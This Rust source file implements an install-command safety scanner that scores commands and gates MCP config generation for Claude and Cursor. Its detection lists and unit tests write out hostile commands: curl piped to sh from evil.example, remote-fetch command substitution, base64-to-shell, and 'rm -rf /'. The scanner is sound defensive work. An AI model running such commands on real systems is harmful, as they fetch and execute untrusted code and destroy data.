//! Install safety scanner — classifies install command risk and produces safe copy text.

use serde::{Deserialize, Serialize};

/// Output of the install safety scanner.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct InstallSafetyAssessment {
    pub risk_level: String,
    pub reasons: Vec<String>,
    pub requires_secret: bool,
    pub safe_copy_command: Option<String>,
}

#[derive(Debug)]
struct InstallCommand<'a> {
    raw: &'a str,
    lower: String,
}

impl<'a> InstallCommand<'a> {
    fn parse(install_command: Option<&'a str>) -> Option<Self> {
        let raw = install_command.map(str::trim).filter(|s| !s.is_empty())?;
        Some(Self {
            raw,
            lower: raw.to_lowercase(),
        })
    }

    fn contains(&self, marker: &str) -> bool {
        self.lower.contains(marker)
    }

    fn contains_any(&self, markers: &[&str]) -> bool {
        markers.iter().any(|marker| self.contains(marker))
    }

    fn starts_with_any(&self, prefixes: &[&str]) -> bool {
        prefixes.iter().any(|prefix| self.lower.starts_with(prefix))
    }

    fn pipes_to_shell(&self) -> bool {
        self.contains_any(&["| sh", "| bash"])
    }

    fn has_base64_shell_pipe(&self) -> bool {
        self.contains("base64") && self.pipes_to_shell()
    }

    fn fetches_remote_script_into_shell(&self) -> bool {
        self.contains_any(&["curl", "wget"]) && self.pipes_to_shell()
    }

    fn uses_shell_command_wrapper(&self) -> bool {
        self.contains_any(&["bash -c", "sh -c"])
    }

    fn substitutes_remote_fetch(&self) -> bool {
        self.contains("$(") && self.contains_any(&["curl", "wget"])
    }

    fn is_known_package_manager_command(&self) -> bool {
        self.starts_with_any(KNOWN_PACKAGE_MANAGER_PREFIXES)
    }
}

#[derive(Debug, Default)]
struct RiskSignals {
    score: i32,
    reasons: Vec<String>,
    requires_secret: bool,
}

impl RiskSignals {
    fn flag(&mut self, score: i32, reason: &str) {
        self.score = self.score.max(score);
        self.reasons.push(reason.to_string());
    }

    fn ensure_reason(&mut self, reason: &str) {
        if self.reasons.is_empty() {
            self.reasons.push(reason.to_string());
        }
    }

    fn into_assessment(mut self, command: &InstallCommand<'_>) -> InstallSafetyAssessment {
        self.ensure_reason("no elevated risk patterns detected");
        let risk_level = RiskLevel::from_score(self.score);

        InstallSafetyAssessment {
            risk_level: risk_level.as_str().to_string(),
            reasons: self.reasons,
            requires_secret: self.requires_secret,
            safe_copy_command: risk_level.safe_copy_command(command),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RiskLevel {
    Low,
    Medium,
    High,
    Critical,
}

impl RiskLevel {
    fn from_score(score: i32) -> Self {
        match score {
            90.. => Self::Critical,
            70..=89 => Self::High,
            40..=69 => Self::Medium,
            _ => Self::Low,
        }
    }

    fn from_label(label: &str) -> Self {
        match label {
            "critical" => Self::Critical,
            "high" => Self::High,
            "medium" => Self::Medium,
            _ => Self::Low,
        }
    }

    fn as_str(self) -> &'static str {
        match self {
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        }
    }

    fn blocks_structured_config(self) -> bool {
        matches!(self, Self::High | Self::Critical)
    }

    fn safe_copy_command(self, command: &InstallCommand<'_>) -> Option<String> {
        matches!(self, Self::Low | Self::Medium).then(|| command.raw.to_string())
    }
}

/// Assess an install command for safety risk.
pub fn assess_install(
    install_command: Option<&str>,
    npm_package: Option<&str>,
) -> InstallSafetyAssessment {
    let Some(command) = InstallCommand::parse(install_command) else {
        return missing_install_assessment();
    };

    let mut signals = scan_command_risks(&command);
    apply_package_manager_context(&mut signals, &command, npm_package);
    signals.into_assessment(&command)
}

fn missing_install_assessment() -> InstallSafetyAssessment {
    InstallSafetyAssessment {
        risk_level: "medium".into(),
        reasons: vec!["no install command provided".into()],
        requires_secret: false,
        safe_copy_command: None,
    }
}

fn scan_command_risks(command: &InstallCommand<'_>) -> RiskSignals {
    let mut signals = RiskSignals::default();
    flag_destructive_commands(&mut signals, command);
    flag_remote_shell_execution(&mut signals, command);
    flag_config_redirection(&mut signals, command);
    flag_credential_exfiltration(&mut signals, command);
    flag_secret_requirements(&mut signals, command);
    flag_global_installs(&mut signals, command);
    signals
}

fn flag_destructive_commands(signals: &mut RiskSignals, command: &InstallCommand<'_>) {
    if command.contains_any(&["rm -rf", "rm -fr"]) {
        signals.flag(100, "destructive rm -rf command");
    }
}

fn flag_remote_shell_execution(signals: &mut RiskSignals, command: &InstallCommand<'_>) {
    if command.has_base64_shell_pipe() {
        signals.flag(100, "obfuscated base64 piped to shell");
    }
    if command.fetches_remote_script_into_shell() {
        signals.flag(80, "remote script fetched and piped to shell");
    }
    if command.uses_shell_command_wrapper() {
        signals.flag(75, "shell -c wrapper executes arbitrary command string");
    }
    if command.substitutes_remote_fetch() {
        signals.flag(100, "command substitution fetching remote code");
    }
}

fn flag_config_redirection(signals: &mut RiskSignals, command: &InstallCommand<'_>) {
    if command.contains_any(&["> ~/.", ">> ~/.", ">~/"]) {
        signals.flag(75, "shell redirection into config files");
    }
}

fn flag_credential_exfiltration(signals: &mut RiskSignals, command: &InstallCommand<'_>) {
    for (tool, secret) in CREDENTIAL_EXFILTRATION_PATTERNS {
        if command.contains(tool) && command.contains(secret) {
            signals.flag(100, "credential exfiltration pattern");
        }
    }
}

fn flag_secret_requirements(signals: &mut RiskSignals, command: &InstallCommand<'_>) {
    signals.requires_secret = SECRET_MARKERS.iter().any(|marker| command.contains(marker));
    if signals.requires_secret {
        signals.flag(45, "requires API key or environment secret");
    }
}

fn flag_global_installs(signals: &mut RiskSignals, command: &InstallCommand<'_>) {
    if command.contains_any(GLOBAL_INSTALL_MARKERS) {
        signals.flag(40, "global package install");
    }
}

fn apply_package_manager_context(
    signals: &mut RiskSignals,
    command: &InstallCommand<'_>,
    npm_package: Option<&str>,
) {
    if command.is_known_package_manager_command() && npm_package.is_some() {
        signals.score = signals.score.min(20);
        signals.ensure_reason("documented package manager install");
        return;
    }

    if !command.is_known_package_manager_command() && signals.score < 50 {
        signals.score = signals.score.max(45);
        signals
            .reasons
            .push("unknown or non-package-manager binary command".into());
    }
}

const CREDENTIAL_EXFILTRATION_PATTERNS: &[(&str, &str)] = &[
    ("curl", "secret"),
    ("wget", "token"),
    ("curl", "api_key"),
    ("curl", "password"),
];

const SECRET_MARKERS: &[&str] = &[
    "api_key",
    "api-key",
    "apikey",
    "secret",
    "token",
    "private_key",
    "private-key",
    "${",
    "$env",
];

const GLOBAL_INSTALL_MARKERS: &[&str] = &[
    "npm i -g",
    "npm install -g",
    "pnpm add -g",
    "yarn global",
    "cargo install",
];

const KNOWN_PACKAGE_MANAGER_PREFIXES: &[&str] = &[
    "npm i ",
    "npm install ",
    "pnpm add ",
    "pnpm install ",
    "yarn add ",
    "npx ",
    "cargo install ",
    "pip install ",
];

/// Whether Claude/Cursor JSON config generation should be blocked for this risk level.
pub fn blocks_structured_config(risk_level: &str) -> bool {
    RiskLevel::from_label(risk_level).blocks_structured_config()
}

/// Human-readable warning for risky install commands.
pub fn install_warning_text(risk_level: &str) -> Option<&'static str> {
    match RiskLevel::from_label(risk_level) {
        RiskLevel::Critical => Some(
            "Install blocked pending operator review. This command contains critical safety risks.",
        ),
        RiskLevel::High => Some(
            "High-risk install command. Review carefully before running. Structured editor config is not generated for this command.",
        ),
        RiskLevel::Medium => Some(
            "Medium-risk install command. May require secrets or elevated permissions.",
        ),
        RiskLevel::Low => None,
    }
}

/// Build a safe Claude Desktop MCP config JSON when the install command is low/medium risk.
///
/// Parses simple `npx package` / `npm exec` patterns into structured command+args.
/// Returns `None` for high/critical risk or unparseable commands.
pub fn claude_mcp_config(server_name: &str, install: &str, risk_level: &str) -> Option<String> {
    if blocks_structured_config(risk_level) || install.trim().is_empty() {
        return None;
    }

    let parts: Vec<&str> = install.split_whitespace().collect();
    if parts.is_empty() {
        return None;
    }

    let (command, args): (&str, Vec<&str>) = match parts[0] {
        "npx" | "npm" | "pnpm" | "yarn" | "cargo" | "pip" | "pip3" | "node" => {
            (parts[0], parts[1..].to_vec())
        }
        _ => return None,
    };

    let args_json: Vec<String> = args.iter().map(|a| format!("\"{a}\"")).collect();
    Some(format!(
        "{{\"mcpServers\":{{\"{server_name}\":{{\"command\":\"{command}\",\"args\":[{}]}}}}}}",
        args_json.join(",")
    ))
}

/// Build Cursor install guidance text (no raw sh -c wrapping).
pub fn cursor_install_note(install: &str, risk_level: &str) -> String {
    if blocks_structured_config(risk_level) {
        "Structured Cursor config is not available for this high-risk install command. \
         Review the generic install command and add manually if you trust the source."
            .to_string()
    } else {
        format!("Add to Cursor MCP settings using the install command:\n{install}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn low_risk_npm_install_with_package() {
        let a = assess_install(Some("npm i @scope/wallet-mcp"), Some("@scope/wallet-mcp"));
        assert_eq!(a.risk_level, "low");
        assert_eq!(
            a.safe_copy_command.as_deref(),
            Some("npm i @scope/wallet-mcp")
        );
    }

    #[test]
    fn low_risk_cargo_install() {
        let a = assess_install(
            Some("cargo install bob-gateway-cli"),
            Some("bob-gateway-cli"),
        );
        assert_eq!(a.risk_level, "low");
        assert!(a.safe_copy_command.is_some());
    }

    #[test]
    fn medium_risk_requires_api_key() {
        let a = assess_install(
            Some("export API_KEY=xxx && npm i @tool/mcp"),
            Some("@tool/mcp"),
        );
        assert_eq!(a.risk_level, "medium");
        assert!(a.requires_secret);
    }

    #[test]
    fn high_risk_curl_pipe_sh() {
        let a = assess_install(Some("curl https://evil.example/install.sh | sh"), None);
        assert_eq!(a.risk_level, "high");
        assert!(a.safe_copy_command.is_none());
        assert!(a
            .reasons
            .iter()
            .any(|r| r.contains("remote script") || r.contains("shell")));
    }

    #[test]
    fn high_risk_sh_c_wrapper() {
        let a = assess_install(Some("sh -c \"npx @foo/mcp\""), None);
        assert_eq!(a.risk_level, "high");
        assert!(blocks_structured_config(&a.risk_level));
    }

    #[test]
    fn critical_rm_rf() {
        let a = assess_install(Some("curl https://x.com/a.sh | sh && rm -rf /"), None);
        assert_eq!(a.risk_level, "critical");
        assert!(a.reasons.iter().any(|r| r.contains("rm -rf")));
    }

    #[test]
    fn critical_base64_obfuscation() {
        let a = assess_install(Some("echo c2g= | base64 -d | sh"), None);
        assert_eq!(a.risk_level, "critical");
        assert!(a.reasons.iter().any(|r| r.contains("base64")));
    }

    #[test]
    fn critical_command_substitution_remote_fetch() {
        let a = assess_install(
            Some("bash -c \"$(curl https://evil.example/run.sh)\""),
            None,
        );
        assert_eq!(a.risk_level, "critical");
    }

    #[test]
    fn empty_install_is_medium() {
        let a = assess_install(None, None);
        assert_eq!(a.risk_level, "medium");
    }

    #[test]
    fn claude_config_generated_for_low_risk_npx() {
        let json = claude_mcp_config("wallet-mcp", "npx @scope/wallet-mcp", "low").unwrap();
        assert!(json.contains("\"command\":\"npx\""));
        assert!(json.contains("@scope/wallet-mcp"));
        assert!(!json.contains("sh"));
        assert!(!json.contains("-c"));
    }

    #[test]
    fn claude_config_blocked_for_high_risk() {
        assert!(claude_mcp_config("tool", "curl https://x.com | sh", "high").is_none());
    }

    #[test]
    fn install_warning_for_critical() {
        assert!(install_warning_text("critical")
            .unwrap()
            .contains("blocked"));
    }
}
